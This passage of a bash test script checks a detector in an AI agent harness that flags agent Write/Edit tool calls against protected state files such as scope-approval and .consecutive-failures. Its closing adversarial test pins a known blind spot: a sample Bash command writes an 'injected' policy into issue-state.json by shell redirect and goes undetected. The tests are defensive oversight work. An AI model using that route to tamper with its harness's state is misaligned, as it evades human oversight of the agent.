# AC-D003-H: Write against /.consecutive-failures → rc=1 (ENG-155 review finding #1)
TX_D003H="$_TEST_STUB_DIR/tx-d003h.ndjson"
cat > "$TX_D003H" <<'NDJSON'
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Write","input":{"file_path":"/Users/x/.local/state/twinning-harness/harness/foo/ENG-1/.consecutive-failures"}}]}}
NDJSON
out_d003h="$(assert_no_tool_with_input_path "$TX_D003H" "Write,Edit" "file_path" "/.consecutive-failures" "contains")" && rc_d003h=0 || rc_d003h=$?
if [[ "$rc_d003h" == "1" && "$out_d003h" == *"/.consecutive-failures" ]]; then
  pass_at "AC-D003-H: Write on /.consecutive-failures → rc=1 + matched path"
else
  fail_at "AC-D003-H" "rc=$rc_d003h out=$out_d003h"
fi

# AC-D003-I: Edit against /.in-flight.lock (directory; matched via its path) → rc=1 (ENG-155 review finding #1)
TX_D003I="$_TEST_STUB_DIR/tx-d003i.ndjson"
cat > "$TX_D003I" <<'NDJSON'
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Edit","input":{"file_path":"/Users/x/.local/state/twinning-harness/harness/foo/ENG-1/.in-flight.lock/pid"}}]}}
NDJSON
out_d003i="$(assert_no_tool_with_input_path "$TX_D003I" "Write,Edit" "file_path" "/.in-flight.lock" "contains")" && rc_d003i=0 || rc_d003i=$?
if [[ "$rc_d003i" == "1" && "$out_d003i" == *"/.in-flight.lock"* ]]; then
  pass_at "AC-D003-I: Edit on /.in-flight.lock/pid → rc=1 (contains /.in-flight.lock)"
else
  fail_at "AC-D003-I" "rc=$rc_d003i out=$out_d003i"
fi

# AC-D003-J: Write against /scope-approval sentinel → rc=1 (ENG-155 review finding #1)
TX_D003J="$_TEST_STUB_DIR/tx-d003j.ndjson"
cat > "$TX_D003J" <<'NDJSON'
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Write","input":{"file_path":"/Users/x/.local/state/twinning-harness/harness/foo/ENG-1/scope-approval"}}]}}
NDJSON
out_d003j="$(assert_no_tool_with_input_path "$TX_D003J" "Write,Edit" "file_path" "/scope-approval" "contains")" && rc_d003j=0 || rc_d003j=$?
if [[ "$rc_d003j" == "1" && "$out_d003j" == *"/scope-approval" ]]; then
  pass_at "AC-D003-J: Write on /scope-approval → rc=1 + matched path"
else
  fail_at "AC-D003-J" "rc=$rc_d003j out=$out_d003j"
fi

# AC-D003-FP: adversarial — file OUTSIDE $issue_state_dir with matching substring trips the detective.
# This is the accepted trade-off for unanchored contains patterns (review finding #2, dispatch.sh:302):
# patterns like "/wait-" match anywhere in file_path, not just under $issue_state_dir. A Write to
# a file named "wait-something.md" directly in any directory (e.g. docs/plans/wait-something.md)
# produces a path ending in ".../plans/wait-something.md" which DOES contain "/wait-" (the
# directory-separator slash + the filename). The FP fires; rc=29; recoverable via --action continue.
# Note: hyphenated names like "2026-X-wait-something.md" have "-wait-" (not "/wait-") and do NOT
# trigger the FP. Pinned here so future anchoring (would flip rc to 0) updates this test.
TX_D003FP="$_TEST_STUB_DIR/tx-d003fp.ndjson"
cat > "$TX_D003FP" <<'NDJSON'
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Write","input":{"file_path":"/Users/x/code/twinning-harness/docs/plans/wait-something.md"}}]}}
NDJSON
out_d003fp="$(assert_no_tool_with_input_path "$TX_D003FP" "Write,Edit" "file_path" "/wait-" "contains")" && rc_d003fp=0 || rc_d003fp=$?
if [[ "$rc_d003fp" == "1" ]]; then
  pass_at "AC-D003-FP: OQ-5 FP pin — Write on docs/plans/wait-something.md trips /wait- (unanchored, known trade-off; review finding #2)"
else
  fail_at "AC-D003-FP: expected rc=1 (OQ-5 FP behavior)" "rc=$rc_d003fp out=$out_d003fp"
fi

# ─── ENG-155 AC-ADDDIR: --add-dir argv splice and DRY_RUN log ────────────
printf '\n--- ENG-155 AC-ADDDIR: --add-dir $issue_state_dir in dispatch argv ---\n'

# Ensure the claude stub is on PATH (Group 2 restored OLD_PATH after its test).
# Re-create a fresh argv capture file and set PATH.
_ADDDIR_ARGV_CAPTURE="$_TEST_STUB_DIR/argv-adddir.capture"
: > "$_ADDDIR_ARGV_CAPTURE"
# Re-use or re-create the claude stub so it writes to our new capture file.
cat > "$_TEST_STUB_DIR/claude-adddir" <<SH
#!/usr/bin/env bash
printf '%s\n' "\$@" > "$_ADDDIR_ARGV_CAPTURE"
cat > /dev/null
exit 0
SH
chmod +x "$_TEST_STUB_DIR/claude-adddir"
# Symlink claude-adddir as claude (overwrite) for this test group.
ln -sf "$_TEST_STUB_DIR/claude-adddir" "$_TEST_STUB_DIR/claude"

_ADDDIR_ISSUE_ID="ENG-T-ADDDIR"
_ADDDIR_ISSUE_DIR="${PROJECT_STATE_DIR}/${_ADDDIR_ISSUE_ID}"
mkdir -p "$_ADDDIR_ISSUE_DIR"

( PIPELINE_DRY_RUN=0 PIPELINE_ISSUE_ID="$_ADDDIR_ISSUE_ID" \
  PATH="$_TEST_STUB_DIR:$OLD_PATH" \
  main "planning" "$_PROMPT_FILE" 2>/dev/null ) || true

if grep -Fxq -- '--add-dir' "$_ADDDIR_ARGV_CAPTURE"; then
  _adddir_line_num="$(grep -n '^--add-dir$' "$_ADDDIR_ARGV_CAPTURE" | head -1 | cut -d: -f1)"
  _adddir_next_line="$(sed -n "$((_adddir_line_num + 1))p" "$_ADDDIR_ARGV_CAPTURE")"
  if [[ "$_adddir_next_line" == *"$_ADDDIR_ISSUE_DIR"* ]]; then
    pass_at "AC-ADDDIR: --add-dir present in claude argv with correct issue_state_dir path"
  else
    fail_at "AC-ADDDIR: --add-dir present but next arg doesn't match issue_dir" \
      "expected path containing: $_ADDDIR_ISSUE_DIR, got: $_adddir_next_line"
  fi
else
  fail_at "AC-ADDDIR: --add-dir missing from claude argv (D-001 not implemented)" \
    "argv: $(tr '\n' ' ' < "$_ADDDIR_ARGV_CAPTURE")"
fi

# AC-ADDDIR no-issue-id: dispatch without PIPELINE_ISSUE_ID must NOT carry --add-dir
_ADDDIR_NOISSUE_ARGV="$_TEST_STUB_DIR/argv-adddir-noissue.capture"
: > "$_ADDDIR_NOISSUE_ARGV"
cat > "$_TEST_STUB_DIR/claude-noissue" <<SH2
#!/usr/bin/env bash
printf '%s\n' "\$@" > "$_ADDDIR_NOISSUE_ARGV"
cat > /dev/null
exit 0
SH2
chmod +x "$_TEST_STUB_DIR/claude-noissue"
ln -sf "$_TEST_STUB_DIR/claude-noissue" "$_TEST_STUB_DIR/claude"

( PIPELINE_DRY_RUN=0 \
  PATH="$_TEST_STUB_DIR:$OLD_PATH" \
  main "brainstorming" "$_PROMPT_FILE" 2>/dev/null ) || true

if ! grep -Fxq -- '--add-dir' "$_ADDDIR_NOISSUE_ARGV"; then
  pass_at "AC-ADDDIR no-issue-id: --add-dir absent when PIPELINE_ISSUE_ID unset (non-run-stage caller)"
else
  fail_at "AC-ADDDIR no-issue-id: --add-dir must NOT appear without PIPELINE_ISSUE_ID" \
    "argv: $(tr '\n' ' ' < "$_ADDDIR_NOISSUE_ARGV")"
fi

# AC-ADDDIR DRY_RUN: rendered --add-dir appears in the "would invoke" log line
_ADDDIR_DRYRUN_OUT="$_TEST_STUB_DIR/adddir-dryrun.log"
( PIPELINE_DRY_RUN=1 PIPELINE_ISSUE_ID="$_ADDDIR_ISSUE_ID" \
  PATH="$_TEST_STUB_DIR:$OLD_PATH" \
  main "planning" "$_PROMPT_FILE" 2>"$_ADDDIR_DRYRUN_OUT" ) || true

if grep -qE -- '--verbose( --model [^ ]+)? --add-dir [^ ]+ --setting-sources project,local' \
   "$_ADDDIR_DRYRUN_OUT"; then
  pass_at "AC-ADDDIR DRY_RUN: --add-dir present between --verbose and --setting-sources in dry-run log"
else
  fail_at "AC-ADDDIR DRY_RUN: --add-dir missing or misplaced in dry-run log (D-001 not implemented or DRY_RUN log not updated)" \
    "log: $(cat "$_ADDDIR_DRYRUN_OUT" 2>/dev/null)"
fi

# ─── QA adversarial: ENG-155 D-003 Bash-channel gap ─────────────────────
# D-003 detective only inspects Write/Edit tool_use entries — a Bash tool_use
# whose command contains a redirect to issue-state.json is NOT caught. This
# is a known gap (the envelope validator covers the mcp__plugin_linear /
# curl channel; the allowlist prefix gate is the Bash-channel defense). Pin
# the known behavior so a future tightening is an explicit decision, not drift.
printf '\n--- QA-ADV-D003-BASH-GAP: Bash tool_use writing to issue-state.json → NOT trapped ---\n'
TX_BASH_GAP="$_TEST_STUB_DIR/tx-bash-gap.ndjson"
cat > "$TX_BASH_GAP" <<'NDJSON'
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"echo '{\"policy\":\"injected\"}' > /Users/x/.local/state/twinning-harness/harness/foo/ENG-1/issue-state.json"}}]}}
NDJSON
out_bash_gap="$(assert_no_tool_with_input_path "$TX_BASH_GAP" "Write,Edit" "file_path" "/issue-state.json" "contains")" && rc_bash_gap=0 || rc_bash_gap=$?
if [[ "$rc_bash_gap" == "0" && -z "$out_bash_gap" ]]; then
  pass_at "QA-ADV-D003-BASH-GAP: Bash tool_use with issue-state.json redirect → rc=0 (D-003 blind spot; Bash channel defended by allowlist prefix gate)"
else
  fail_at "QA-ADV-D003-BASH-GAP" "rc=$rc_bash_gap out=$out_bash_gap (unexpected — D-003 should not catch Bash tool_use)"
fi
rm -f "$TX_BASH_GAP"

# ─── Summary ────────────────────────────────────────────────────────────
printf '\nRESULTS: %d passed, %d failed\n' "$PASS" "$FAIL"
[[ "$FAIL" == 0 ]] || exit 1
exit 0
